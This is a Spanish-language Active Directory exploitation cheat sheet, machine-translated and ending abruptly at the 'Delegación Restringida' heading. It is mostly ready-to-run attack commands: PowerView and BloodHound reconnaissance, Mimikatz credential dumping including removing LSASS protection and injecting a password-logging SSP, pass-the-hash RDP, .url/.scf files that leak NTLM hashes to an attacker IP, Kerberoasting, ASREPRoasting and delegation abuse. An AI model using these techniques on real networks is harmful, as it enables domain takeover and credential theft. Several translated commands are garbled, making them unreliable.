Hoja de referencia sobre explotación de Active Directory

Esta hoja de referencia contiene métodos comunes de enumeración y ataque para Windows Active Directory.

Esta hoja de referencia está inspirada en el repositorio [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).

![Solo paseando al perro](https://github.com/buftas/Active-Directory-Exploitation-Cheatsheet/blob/master/WalkTheDog.png)

## Resumen

- [Hoja de trucos para la explotación de Active Directory](#active-directory-exploitation-cheat-sheet)
- [Resumen](#summary)
- [Herramientas](#tools)
- [Enumeración de dominios](#domain-enumeration)
- [Uso de PowerView](#using-powerview)
- [Uso del módulo AD](#using-ad-module)
- [Uso de BloodHound](#using-bloodhound)
- [BloodHound remoto](#remote-bloodhound)
- [BloodHound local](#on-site-bloodhound)
- [Uso de Adalanche](#using-adalanche)
- [Remoto [adalanche](#remote-adalanche)
- [Exportar objetos enumerados](#export-enumerated-objects)
- [Herramientas útiles de enumeración](#useful-enumeration-tools)
- [Escalada de privilegios locales](#local-privilege-escalation)
- [Herramientas útiles de esc de privilegios locales](#useful-local-priv-esc-tools)
- [Movimiento lateral](#lateral-movement)
- [Comunicación remota con PowerShell](#powershell-remoting)
- [Ejecución remota de código con credenciales de PS](#remote-code-execution-with-ps-credentials)
- [Importar un módulo de PowerShell y ejecutar sus funciones remotamente](#import-a-powershell-module-and-execute-its-functions-remotely)
- [Ejecución remota con estado Comandos](#ejecución-de-comandos-remotos-con-estado)
- [Mimikatz](#mimikatz)
- [Protocolo de Escritorio Remoto](#protocolo-de-escritorio-remoto)
- [Ataques a archivos URL](#ataques-a-archivos-url)
- [Herramientas útiles](#herramientas-útiles)
- [Escalada de privilegios de dominio](#escalada-de-privilegios-de-dominio)
- [Kerberoast](#kerberoast)
- [ASREPRoast](#asreproast)
- [Ataque de rociado de contraseñas](#ataque-de-rociado-de-contraseñas)
- [Forzar el establecimiento de SPN](#force-set-spn)
- [Abusar de las instantáneas](#abusing-shadow-copies)
- [Listar y descifrar credenciales almacenadas usando Mimikatz](#list-and-decrypt-stored-credentials-using-mimikatz)
- [Delegación sin restricciones](#unconstrained-delegation)
- [Delegación restringida](#constrained-delegation)
- [Delegación restringida basada en recursos](#resource-based-constrained-delegation)
- [Abuso de administradores de DNS](#dnsadmins-abuse)
- [Abuso de DNS integrado en Active Directory](#abusing-active-directory-integraded-dns)
- [Abuso del grupo de operadores de respaldo](#abusing-backup-operators-group)
- [Abuso de Exchange](#abusing-exchange)
- [Armas de errores de impresora](#armas-de-errores-de-impresora)
- [Abuso de ACL](#abusing-acls)
- [Abuso de IPv6 con mitm6](#abusing-ipv6-with-mitm6)
- [Abuso del historial de SID](#sid-history-abuse)
- [Explotación de SharePoint](#exploiting-sharepoint)
- [Zerologon](#zerologon)
- [PrintNightmare](#printnightmare)
- [Servicios de certificados de Active Directory](#active-directory-certificate-services)
- [Sin PAC](#no-pac)
- [Persistencia del dominio](#domain-persistence)
- [Ataque de ticket dorado](#golden-ticket-attack)
- [Ataque de sincronización de DC](#dcsync-attack)
- [Ataque de ticket plateado](#silver-ticket-attack)
- [Ataque de clave maestra](#skeleton-key-attack)
- [Abuso de DSRM](#dsrm-abuse)
- [Personalizado SSP](#custom-ssp)
- [Ataques entre bosques](#cross-forest-attacks)
- [Tickets de confianza](#trust-tickets)
- [Abuso de servidores MSSQL](#abuse-mssql-servers)
- [Romper confianzas de bosque](#breaking-forest-trusts)

## Herramientas

- [Powersploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus) -> [Versión compilada](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Módulo AD](https://github.com/samratashok/ADModule)
- [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
- [Adalanche](https://github.com/lkarlslund/adalanche)

## Enumeración de dominios

### Uso de PowerView

[PowerView v.3.0](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)<br>
[PowerView Wiki](https://powersploit.readthedocs.io/en/latest/)

- **Obtener dominio actual:** `Get-Domain`
- **Enumerar otros dominios:** `Get-Domain -Domain <DomainName>`
- **Obtener SID del dominio:** `Get-DomainSID`
- **Obtener política del dominio:**

```powershell
Get-DomainPolicy

#Mostrará la configuración de políticas del dominio sobre acceso al sistema o Kerberos
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
```

- **Obtener controladores de dominio:**
```powershell
Get-DomainController
Get-DomainController -Domain <DomainName>
```
- **Enumerar usuarios del dominio:**

```powershell
#Guardar todos los usuarios del dominio en un archivo
Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

#Devolverá las propiedades específicas de un usuario específico
Get-DomainUser -Identity [nombre de usuario] -Properties DisplayName, MemberOf | Format-List

#Enumerar el usuario conectado a una máquina
Get-NetLoggedon -ComputerName <Nombre de la computadora>

#Enumerar la información de la sesión de una máquina
Get-NetSession -ComputerName <Nombre de la computadora>

#Enumerar las máquinas del dominio actual/especificado donde los usuarios específicos han iniciado sesión
Find-DomainUserLocation -Domain <Nombre del dominio> | Select-Object UserName, SessionFromName
```

- **Enumerar equipos del dominio:**

```powershell
Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

#Enumerar máquinas activas
Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
```

- **Enumerar grupos y miembros del grupo:**

```powershell
#Guardar todos los grupos de dominio en un archivo:
Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

#Devolver miembros de un grupo específico (p. ej., administradores de dominio y administradores de empresa)
Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName

#Enumerar los grupos locales en la máquina local (o remota). Requiere derechos de administrador local en la máquina remota.
Get-NetLocalGroup | Select-Object GroupName

#Enumera los miembros de un grupo local específico en el equipo local (o remoto). También requiere permisos de administrador local en el equipo remoto.
Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

#Devuelve todas las GPO de un dominio que modifican la pertenencia a grupos locales mediante Grupos Restringidos o Preferencias de Directiva de Grupo.
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
```

- **Enumerar recursos compartidos:**

```powershell
#Enumerar recursos compartidos de dominio
Find-DomainShare

#Enumerar los recursos compartidos de dominio a los que tiene acceso el usuario actual
Find-DomainShare -CheckShareAccess

#Enumerar archivos "interesantes" en recursos compartidos accesibles
Find-InterestingDomainShareFile -Include *passwords*
```

- **Enumerar directivas de grupo:**

```powershell
Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

#Enumerar todos los GPO de un equipo específico
Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName

#Obtener usuarios que forman parte del grupo de administración local de una máquina
Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
```

- **Enum OUs:**
```powershell
Get-DomainOU -Properties Name | Sort-Object - Nombre de la propiedad
```
- **Enum ACLs:**

```powershell
# Devuelve las ACL asociadas a la cuenta especificada
Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs

# Busca ACEs interesantes
Find-InterestingDomainAcl -ResolveGUIDs

# Comprueba las ACL asociadas a una ruta específica (p. ej., recurso compartido SMB)
Get-PathAcl -Path "\\Path\Of\A\Share"
```

- **Enum Domain Trust:**

```powershell
Get-DomainTrust
Get-DomainTrust -Domain <DomainName>

# Enumera todas las confianzas del dominio actual y, a continuación, enumera todas las confianzas de cada dominio encontrado
Get-DomainTrustMapping
```

- **Enum Forest Trust:**

```powershell
Get-ForestDomain
Get-ForestDomain -Forest <ForestName>

#Mapear la confianza del bosque
Get-ForestTrust
Get-ForestTrust -Forest <ForestName>
```

- **Búsqueda de usuarios:**

```powershell
#Busca todas las máquinas del dominio actual donde el usuario actual tiene acceso de administrador local
Find-LocalAdminAccess -Verbose

#Buscar administradores locales en todas las máquinas del dominio
Find-DomainLocalGroupMember -Verbose

#Buscar computadoras donde un administrador de dominio o un usuario específico tiene sesión
Find-DomainUserLocation | Select-Object NombreUsuario, SessionFromName

#Confirmando acceso de administrador
Test-AdminAccess
```

:heavy_exclamation_mark: **Esc privado al administrador del dominio con búsqueda de usuarios:** \
Tengo acceso de administrador local en una máquina -> Un administrador del dominio tiene una sesión en esa máquina -> Robo su token y me hago pasar por él -> ¡Gana dinero!

### Usando el módulo AD

- **Obtener dominio actual:** `Get-ADDomain`
- **Enumerar otros dominios:** `Get-ADDomain -Identity <Domain>`
- **Obtener SID de dominio:** `Get-DomainSID`
- **Obtener controladores de dominio:**

```powershell
Get-ADDomainController
Get-ADDomainController -Identity <DomainName>
```

- **Enumerar usuarios de dominio:**

```powershell
Get-ADUser -Filter * -Identity <user> -Properties *

#Obtener una "cadena" específica en el atributo de un usuario
Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | Seleccionar Nombre, Descripción
```

- **Enumeración de Equipos de Dominio:**
```powershell
Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter *
```
- **Enumeración de Confianza de Dominio:**
```powershell
Get-ADTrust -Filter *
Get-ADTrust -Identity <NombreDeDominio>
```
- **Enumeración de Confianza de Bosque:**

```powershell
Get-ADForest
Get-ADForest -Identity <NombreDeBosque>

#Dominios de la Enumeración de Bosques
(Get-ADForest).Domains
```

-**Política efectiva de AppLocker local de enumeración:**

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Usando BloodHound

#### BloodHound remoto

[Repositorio de BloodHound en Python](https://github.com/fox-it/BloodHound.py) o instálelo con `pip3 install bloodhound`

```powershell
bloodhound-python -u <Nombre de usuario> -p <Contraseña> -ns <IP del controlador de dominio> -d <Dominio> -c All
```

#### BloodHound local

```powershell
#Usando el ingestor exe
.\SharpHound.exe --CollectionMethod All --LdapUsername <Nombre de usuario> --LdapPassword <Contraseña> --domain <Dominio> --domaincontroller <IP del controlador de dominio> --OutputDirectory <RutaAlArchivo>

#Uso del ingestador de módulos de PowerShell
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All --LdapUsername <NombreDeUsuario> --LdapPassword <Contraseña> --OutputDirectory <RutaAlArchivo>
```

### Uso de Adalanche

#### Adalanche remoto

```bash
# Kali Linux:
./adalanche collect activedirectory --domain <Dominio> \
--username <NombreDeUsuario@Dominio> --password <Contraseña> \
--server <DC>

# Ejemplo:
./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb
## -> Finalizando correctamente

## ¿Algún error?:

# Código de resultado LDAP 200 "Error de red": x509: ¿certificado firmado por una autoridad desconocida?

./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb --tlsmode NoTLS --port 389

# ¿Credenciales no válidas?
./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb --tlsmode NoTLS --port 389 \
--authmode basic

# Analizar datos
# Ir al navegador web -> 127.0.0.1:8080
./adalanche analizar
```

#### Exportar objetos enumerados

Puede exportar objetos enumerados desde cualquier módulo/cmdlet a un archivo XML para su posterior análisis.

El cmdlet `Export-Clixml` crea una representación XML de uno o más objetos en la Infraestructura de Lenguaje Común (CLI) y la almacena en un archivo. A continuación, puede usar el cmdlet `Import-Clixml` para recrear el objeto guardado a partir del contenido de ese archivo.

```powershell
# Exportar usuarios del dominio a un archivo XML.
Get-DomainUser | Export-CliXml .\DomainUsers.xml

# Más adelante, cuando desee utilizarlos para análisis, incluso en cualquier otro equipo.
$DomainUsers = Import-CliXml .\DomainUsers.xml

# Ahora puede aplicar cualquier condición, filtro, etc.

$DomainUsers | select name

$DomainUsers | ? {$_.name -match "Nombre del usuario"}
```

### Herramientas útiles de enumeración

- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) Volcador de información mediante LDAP
- [adidnsdump](https://github.com/dirkjanm/adidnsdump) Volcado de DNS integrado por cualquier usuario autenticado
- [ACLight](https://github.com/cyberark/ACLight) Descubrimiento avanzado de cuentas privilegiadas
- [ADRecon](https://github.com/sense-of-security/ADRecon) Herramienta detallada de reconocimiento de Active Directory

## Escalada de privilegios locales

- [Manual de escalada de privilegios locales de Windows](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook) Manual para escaladas de privilegios locales de Windows

- [Juicy Potato](https://github.com/ohpe/juicy-potato) Abusar de los privilegios SeImpersonate o SeAssignPrimaryToken para suplantación del sistema

Advertencia: Funciona solo hasta Windows Server 2016 y Windows 10 hasta el parche 1803

- [Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato) Juicy Potato automatizado

Advertencia: Funciona solo hasta Windows Server 2016 y Windows 10 hasta el parche 1803

- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) Aprovechar el PrinterBug para suplantación del sistema

Respuesta: Funciona para Windows Server 2019 y Windows 10

- [RoguePotato](https://github.com/antonioCoco/RoguePotato) Juicy Potato actualizado

Funciona en Windows Server 2019 y Windows 10

- [Abuso de privilegios de token](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
- [SMBGhost CVE-2020-0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/) \
[PoC](https://github.com/danigargu/CVE-2020-0796)
- [CVE-2021-36934 (HiveNightmare/SeriousSAM)](https://github.com/cube0x0/CVE-2021-36934)

### Herramientas útiles para el control remoto de privilegios locales

- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Abuso de configuración incorrecta
- [BeRoot](https://github.com/AlessandroZ/BeRoot) Herramienta general de enumeración de privilegios
- [Privesc](https://github.com/enjoiz/Privesc) Herramienta general de enumeración de privilegios
- [FullPowers](https://github.com/itm4n/FullPowers) Restaurar los privilegios de una cuenta de servicio

## Movimiento lateral

### Conexión remota de PowerShell

```powershell
#Habilitar la conexión remota de PowerShell en la máquina actual (requiere Acceso de administrador)
Habilitar PSRemoting

#Iniciar o iniciar una nueva PSSession (Requiere acceso de administrador)
$sess = New-PSSession -ComputerName <Nombre>
Enter-PSSession -ComputerName <Nombre> OR -Sessions <SessionName>

```

### Ejecución remota de código con credenciales de PS

```powershell
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```

### Importar un módulo de PowerShell y ejecutar sus funciones de forma remota

```powershell
#Ejecutar el comando e iniciar una sesión
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess

#Interactuar con Sesión
Enter-PSSession -Session $sess

```

### Ejecución de comandos remotos con estado

```powershell
#Crear una nueva sesión
$sess = New-PSSession -ComputerName <NameOfComputer>

#Ejecutar comando en la sesión
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

#Verificar el resultado del comando para confirmar que tenemos una sesión interactiva
Invoke-Command -Session $sess -ScriptBlock {$ps}
```

### Mimikatz

```powershell
#¡Los comandos están en formato Cobalt Strike!

#Volcar LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#Enumerar todos los tickets de Kerberos disponibles en memoria
mimikatz sekurlsa::tickets

#Volcar las credenciales locales de Terminal Services
mimikatz sekurlsa::tspkg

#Volcar y guardar LSASS en un archivo
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#Enumerar las MasterKeys en caché
mimikatz sekurlsa::dpapi

#Enumerar las claves AES de Kerberos locales
mimikatz sekurlsa::ekeys

#Volcar base de datos SAM
mimikatz lsadump::sam

#Volcar base de datos SECRETOS
mimikatz lsadump::secretos

#Inyectar y volcar las Credenciales del Controlador de Dominio
privilegio mimikatz::depuración
token mimikatz::elevar
mimikatz lsadump::lsa /inyectar

#Volcar las Credenciales del Dominio sin tocar el LSASS de DC y además de forma remota
mimikatz lsadump::dcsync /dominio:<DominioFQDN> /todos

#Volcar contraseñas antiguas y hashes NTLM de un usuario
mimikatz lsadump::dcsync /usuario:<DomainFQDN>\<usuario> /history

#Listar y volcar credenciales de Kerberos locales
mimikatz kerberos::lista /volcado

#Pase el billete
mimikatz kerberos::ptt <PathToKirbiFile>

#Listar sesiones TS/RDP
mimikatz ts::sessions

#Listar credenciales del almacén
mimikatz vault::list
```

:exclamation: ¿Qué ocurre si mimikatz no puede volcar las credenciales debido a los controles de protección LSA?

- LSA como proceso protegido (Omisión del kernel)

```powershell
#Comprueba si LSA se ejecuta como un proceso protegido verificando si la variable "RunAsPPL" está establecida en 0x1
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

#A continuación, sube el archivo mimidriver.sys desde el repositorio oficial de mimikatz a la misma carpeta que tu archivo mimikatz.exe
#Ahora importamos mimidriver.sys al sistema
mimikatz # !+

#Ahora eliminamos las marcas de protección del proceso lsass.exe
mimikatz # !processprotect /process:lsass.exe /remove

#Finalmente, ejecuta la función logonpasswords para volcar lsass
mimikatz # sekurlsa::logonpasswords
```

- LSA como proceso protegido (sin archivos) Omisión)

- [PPLdump](https://github.com/itm4n/PPLdump)
- [Omisión de la protección LSA en Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)

- LSA se ejecuta como un proceso virtualizado (LSAISO) mediante Credential Guard

```powershell
#Comprobar si existe un proceso llamado lsaiso.exe en los procesos en ejecución
tasklist |findstr lsaiso

#Si existe, no hay forma de volcar lsass; solo obtendremos datos cifrados. Sin embargo, podemos usar keyloggers o volcadores de portapapeles para capturar datos. #Inyectemos nuestro propio proveedor de soporte de seguridad malicioso en la memoria. Para este ejemplo, usaré el que proporciona mimikatz.
mimikatz # misc::memssp

#Ahora, cada sesión y autenticación de usuario en esta máquina se registrará, y las credenciales de texto plano se capturarán y se guardarán en c:\windows\system32\mimilsa.log
```

- [Guía detallada de Mimikatz](https://adsecurity.org/?page_id=1821)
- [Explorando dos opciones de protección lsass](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)

### Protocolo de Escritorio Remoto

Si el host al que queremos realizar el traslado lateral tiene habilitado "RestrictedAdmin", podemos pasar el hash mediante el protocolo RDP y obtener una sesión interactiva sin la contraseña de texto plano.

- Mimikatz:

```powershell
#Ejecutamos la función de pasar el hash con mimikatz y generamos una instancia de mstsc.exe con el indicador "/restrictedadmin"
privilege::debug
sekurlsa::pth /user:<Nombre de usuario> /domain:<Nombre de dominio> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"

#Luego, simplemente haga clic en "Aceptar" en el diálogo de RDP y disfrute de una sesión interactiva con el usuario que suplantamos.
```

- xFreeRDP:

```powershell
xfreerdp +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:<Nombre de usuario> /pth:<NTLMHash> /v:<Nombre de host | Dirección IP>
```

:exclamation: Si el modo de administrador restringido está deshabilitado en la máquina remota, podemos conectarnos al host usando otra herramienta/protocolo

Como psexec o winrm, habilítelo creando la siguiente clave de registro y estableciéndola en cero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".

- Omitir la restricción de "Sesión única por usuario"

En un equipo de dominio, si ejecuta comandos como administrador del sistema o local y desea una sesión RDP que otro usuario ya esté usando, puede evitar la restricción de sesión única agregando la siguiente clave de registro:
```powershell
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0
```

Una vez completado el proceso, puede eliminar la clave para restablecer la restricción de una sola sesión por usuario. ```powershell
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUse
```

### Ataques con archivos URL

- Archivo .url

```
[Acceso directo a Internet]
URL=lo que sea
WorkingDirectory=lo que sea
IconFile=\\<IpDelAtacante>\%USERNAME%.icon
IconIndex=1
```

```
[Acceso directo a Internet]
URL=file://<IpDelAtacante>/leak/leak.html
```

- Archivo .scf

```
[Shell]
Comando=2
IconFile=\\<IpDelAtacante>\Share\test.ico
[Barra de tareas]
Comando=ToggleDesktop
```

Colocar estos archivos en un recurso compartido con permisos de escritura para la víctima Solo hay que abrir el explorador de archivos y navegar hasta el recurso compartido. **Nota**: No es necesario abrir el archivo ni que el usuario interactúe con él, pero debe estar en la parte superior del sistema de archivos o visible en la ventana del explorador de Windows para que se pueda renderizar. Use Responder para capturar los hashes.

Los ataques con archivos .scf no funcionan en las últimas versiones de Windows.

### Herramientas útiles

- [Powercat](https://github.com/besimorhino/powercat) netcat está escrito en PowerShell y ofrece funciones de tunelización, retransmisión y redireccionamiento de puertos. - [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) Herramienta de movimiento lateral sin archivos que se basa en ChangeServiceConfigA para ejecutar comandos.
- [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) La shell WinRM definitiva para hacking/pentesting.
- [RunasCs](https://github.com/antonioCoco/RunasCs) Versión CSharp y abierta del runas.exe integrado de Windows.
- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft.git) Crea todos los formatos de archivo posibles para ataques de URL.

## Escalada de Privilegios de Dominio

### Kerberoast

¿QUÉ ES ESTO?:_ \
Todos los usuarios de dominio estándar pueden solicitar una copia de todas las cuentas de servicio junto con sus hashes de contraseña correspondientes, por lo que podemos solicitar a un TGS cualquier SPN vinculado a una cuenta de usuario. Extraer el blob cifrado con la contraseña del usuario y ejecutarlo por fuerza bruta sin conexión. - PowerView:

```powershell
#Obtener las cuentas de usuario que se usan como cuentas de servicio
Get-NetUser -SPN

#Obtener todas las cuentas SPN disponibles, solicitar un TGS y volcar su hash
Invoke-Kerberoast

#Solicitar el TGS para una sola cuenta:
Request-SPNTicket

#Exportar todos los tickets usando Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

- Módulo AD:

```powershell
#Obtener las cuentas de usuario que se usan como cuentas de servicio
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

- Impacket:

```powershell
python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
```

- Rubeus:

```powershell
#Kerberoast y salida en un archivo con un formato específico
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>

#Kerberoast con seguridad "OPSEC", sin intentar asar cuentas con AES habilitado
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec

#Cuentas con AES habilitado para Kerberoast
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes

#Cuenta de usuario específica de Kerberoast
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple

#Kerberoast especificando las credenciales de autenticación
Rubeus.exe kerberoast /outfile:<nombre_archivo> /domain:<nombre_dominio> /creduser:<nombre_usuario> /credpassword:<contraseña>
```

### ASREPRoast

_¿QUÉ ES DIS?:_ \
Si una cuenta de usuario de dominio no requiere preautenticación Kerberos, podemos solicitar un TGT válido para esta cuenta sin siquiera tener credenciales de dominio, extraer el blob cifrado y ejecutarlo por fuerza bruta sin conexión.

- PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
- Módulo AD: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

¡Desactivar forzosamente la preautenticación Kerberos en una cuenta con permisos de escritura o superiores!
Comprobar permisos interesantes en las cuentas:

**Sugerencia:** Añadimos un filtro, por ejemplo Los usuarios de RDPU obtendrán "Cuentas de usuario", no Cuentas de máquina, ya que los hashes de las Cuentas de máquina no se pueden descifrar.

PowerView:

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
Desactivar la preautorización de Kerberos:
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
Comprobar si el valor ha cambiado:
Get-DomainUser -PreauthNotRequired -Verbose
```

- Y finalmente, ejecutar

Ataque con la herramienta [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast).

```powershell
#Obtener el hash de una cuenta específica:
Get-ASREPHash -UserName <UserName> -Verbose

#Obtener los hashes de los usuarios ASREPRoast:
Invoke-ASREPRoast -Verbose
```

- Usando Rubeus:

```powershell
#Intentando el ataque para todos los usuarios del dominio
Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

#Usuario específico de ASREPRoast
Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

#Usuarios de ASREPRoast de una OU (Unidad Organizativa) específica
Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
```

- Usando Impacket:

```powershell
#Intentando el ataque para los usuarios especificados en el archivo
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
```

### Ataque de rociado de contraseñas

Si hemos obtenido algunas contraseñas comprometiendo una cuenta de usuario, podemos usar este método para intentar explotar la reutilización de contraseñas en otras cuentas de dominio.

**Herramientas:**

- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
- [Spray](https://github.com/Greenwolf/Spray)

### Forzar la configuración de SPN

¿Qué es esto?:
Si tenemos suficientes permisos -> GenericAll/GenericWrite, podemos configurar un SPN en una cuenta de destino, solicitar un TGS, obtener su blob y aplicarle fuerza bruta.

- PowerView:

```powershell
#Comprobar permisos interesantes en las cuentas:
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}

#Comprobar si el usuario actual ya tiene un SPN configurado:
Get-DomainUser -Identity <UserName> | select serviceprincipalname

#Forzar la configuración del SPN en la cuenta:
Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
```

- Módulo AD:

```powershell
#Comprobar si el usuario actual ya tiene un SPN configurado
Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName

#Forzar la configuración del SPN en la cuenta:
Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
```

¡Por último, usa cualquier herramienta de la lista anterior para obtener el hash y aplicarle Kerberost!

### Abuso de instantáneas

Si tiene acceso de administrador local en una máquina, intente listar instantáneas; es una forma sencilla de escalar el dominio.

```powershell
#Lista de instantáneas con vssadmin (requiere acceso de administrador)
vssadmin list shadows

#Lista de instantáneas con diskshadow
diskshadow list shadows all

#Crear un enlace simbólico a la instantánea y acceder a ella
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

1. Puede volcar la base de datos SAM de la copia de seguridad y recopilar las credenciales.
2. Buscar las credenciales almacenadas en DPAPI y descifrarlas.
3. Acceder a los archivos confidenciales de la copia de seguridad.

### Listar y descifrar credenciales almacenadas con Mimikatz

Normalmente, las credenciales cifradas se almacenan en:

- `%appdata%\Microsoft\Credentials`
- `%localappdata%\Microsoft\Credentials`

```powershell
#Usando la función cred de mimikatz, podemos enumerar el objeto cred y obtener información sobre él:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"

#Del comando anterior, nos interesa el parámetro "guidMasterKey", que indica qué clave maestra se utilizó para cifrar la credencial.
#Enumeraremos la clave maestra:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"

#Ahora, si nos encontramos en el contexto del usuario (o sistema) al que pertenece la credencial, podemos usar El indicador /rpc para pasar el descifrado de la clave maestra al controlador de dominio:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc

#Ahora tenemos la clave maestra en nuestra caché local:
dpapi::cache

#Finalmente, podemos descifrar la credencial usando la clave maestra en caché:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
```

Artículo detallado:
[Todo sobre DPAPI](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

### Delegación sin restricciones

_¿QUÉ ES DIS?: Si tenemos acceso administrativo en una máquina con la Delegación sin restricciones habilitada, podemos esperar un alto Objetivo de valor o DA para conectarse, robar su TGT, luego usar ptt y suplantarlo.

Usando PowerView:

```powershell
#Descubrir equipos unidos al dominio que tengan habilitada la Delegación sin restricciones
Get-NetComputer -UnConstrained

#Listar tickets y comprobar si un DA o algún objetivo de alto valor ha almacenado su TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

#Comando para monitorizar cualquier sesión entrante en nuestro servidor comprometido
Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay
<WaitInterval> -Verbose

#Volcar los tickets al disco:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

#Suplantar al usuario usando ptt Ataque:
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
```

*

*Nota:** ¡También podemos usar Rubeus!

### Delegación Restringida

